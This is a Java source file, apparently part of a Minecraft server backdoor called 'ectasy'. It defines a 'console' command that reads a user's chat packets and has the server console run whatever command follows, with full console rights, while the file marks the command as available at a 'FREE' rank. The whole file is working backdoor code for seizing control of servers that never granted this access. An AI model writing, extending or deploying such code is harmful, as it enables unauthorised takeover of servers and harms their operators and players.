package dev.ectasy.impl.commands.free;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import org.bukkit.Bukkit;

@CommandInfo(
        name = "console",
        description = "Makes the console execute any command.",
        rank = Rank.FREE,
        blatant = true,
        async = false
)
public class CommandConsole extends AbstractCommand {
    @Override
    public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args){
        if(args.length == 0){
            user.sendMessage("Usage: console <command>");
            return;
        }

        String command = String.join(" ", args);
        Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
        user.sendMessage("The console has executed the command " + user.getMainColor() + command + user.getSecondaryColor() + ".");
    }
}
